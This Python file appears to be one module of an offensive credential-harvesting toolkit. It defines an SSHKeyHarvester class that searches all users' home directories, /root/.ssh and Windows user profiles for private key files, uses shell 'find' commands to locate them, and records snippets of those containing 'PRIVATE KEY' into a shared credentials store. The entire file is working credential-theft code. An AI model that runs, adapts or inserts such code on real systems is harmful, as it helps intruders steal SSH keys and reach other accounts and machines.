"""
SSH key harvesting
"""

import os
from ..core.utils import run_command, safe_read_file


class SSHKeyHarvester:
    """Harvest SSH private keys"""
    
    def __init__(self, credentials: dict, os_type: str):
        self.credentials = credentials
        self.os_type = os_type
    
    def harvest(self):
        """Search for SSH private keys"""
        print("\n[*] Searching for SSH keys...")
        
        search_paths = self._get_search_paths()
        found_keys = []
        
        for path in search_paths:
            if '*' in path:
                # Use find command for wildcard paths
                keys = run_command(f'find {path} -name "id_*" -o -name "*.pem" 2>/dev/null')
                if keys and 'Error' not in keys:
                    found_keys.extend(keys.strip().split('\n'))
            else:
                if os.path.exists(path):
                    found_keys.extend(self._scan_directory(path))
        
        # Process found keys
        ssh_count = 0
        for key_file in found_keys:
            if key_file and os.path.exists(key_file):
                if self._process_key_file(key_file):
                    ssh_count += 1
        
        print(f"  [*] Found {ssh_count} SSH keys")
    
    def _get_search_paths(self) -> list:
        """Get SSH key search paths based on OS"""
        if self.os_type == 'posix':
            home_dirs = run_command('ls /home 2>/dev/null').split()
            paths = [f'/home/{home}/.ssh' for home in home_dirs]
            paths.extend(['/root/.ssh', os.path.expanduser('~/.ssh')])
        else:
            paths = [
                os.path.expanduser('~/.ssh'),
                'C:\\Users\\*\\.ssh'
            ]
        
        return paths
    
    def _scan_directory(self, directory: str) -> list:
        """Scan directory for SSH key files"""
        keys = []
        
        try:
            for file in os.listdir(directory):
                if file.startswith('id_') or file.endswith('.pem'):
                    keys.append(os.path.join(directory, file))
        except PermissionError:
            pass
        
        return keys
    
    def _process_key_file(self, key_file: str) -> bool:
        """Process individual key file"""
        content = safe_read_file(key_file)
        
        if content and 'PRIVATE KEY' in content:
            self.credentials['keys'].append({
                'source': key_file,
                'type': 'SSH Private Key',
                'content': content[:100] + '...'  # Store snippet only
            })
            print(f"  [+] Found SSH key: {key_file}")
            return True
        
        return False